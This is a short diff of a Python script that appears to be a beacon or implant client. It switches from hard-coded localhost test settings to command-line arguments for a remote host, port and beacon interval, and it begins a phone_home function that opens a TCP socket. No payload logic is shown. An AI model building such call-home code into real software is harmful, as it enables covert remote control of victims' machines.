@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!python3
 
 # Standard libraries only
 import sys
@@ -8,21 +8,17 @@ import time
 import pickle
 
 
-# Display script usage if not given correct number of arguments.
-#if len(sys.argv) != 4:
-#    print("usage:", sys.argv[0], "<rhost> <rport> <wait>")
-#    sys.exit(1)
+ # Display script usage if not given correct number of arguments.
+if len(sys.argv) != 4:
+    print("usage:", sys.argv[0], "<rhost> <rport> <beacon_interval_seconds>")
+    sys.exit(1)
+
 
 # Initialize global variables.
-#rhost, rport, wait = sys.argv[1:4]
-#wait = int(wait)
-#rserver = (rhost, int(rport))
+rhost, rport, wait = sys.argv[1:4]
+wait = int(wait)
+rserver = (rhost, int(rport))
 
-# TEMP FOR TESTING
-rhost = "127.0.0.1"
-rport = 7002
-wait = 10
-rserver = (rhost, rport)
 
 def phone_home():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
